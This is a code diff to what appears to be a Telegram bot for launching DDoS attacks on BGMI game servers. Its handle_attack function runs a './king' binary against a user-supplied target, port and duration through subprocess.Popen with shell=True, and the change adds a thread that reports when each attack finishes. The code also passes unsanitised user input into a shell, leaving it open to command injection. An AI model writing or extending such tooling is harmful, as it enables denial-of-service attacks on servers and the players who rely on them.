@@ -321,8 +321,19 @@ def handle_attack(message):
                 log_command(user_id, target, port, time)
                 start_attack_reply(message, target, port, time)  # Call start_attack_reply function
                 full_command = f"./king {target} {port} {time} 100"
-                subprocess.Popen(full_command, shell=True)
+                process = subprocess.Popen(full_command, shell=True)
                 response = f"BGMI Attack Started. Target: {target} Port: {port} Time: {time} seconds"
+                bot.reply_to(message, response)
+                
+                # Wait for attack to complete and send completion message
+                import threading
+                def wait_for_attack():
+                    process.wait()
+                    completion_msg = f"BGMI Attack Finished. Target: {target} Port: {port} Time: {time} seconds"
+                    bot.send_message(message.chat.id, completion_msg)
+                
+                thread = threading.Thread(target=wait_for_attack)
+                thread.start()
         else:
             response = "✅ Usage :- /attack <target> <port> <time>"  # Updated command syntax
     else:
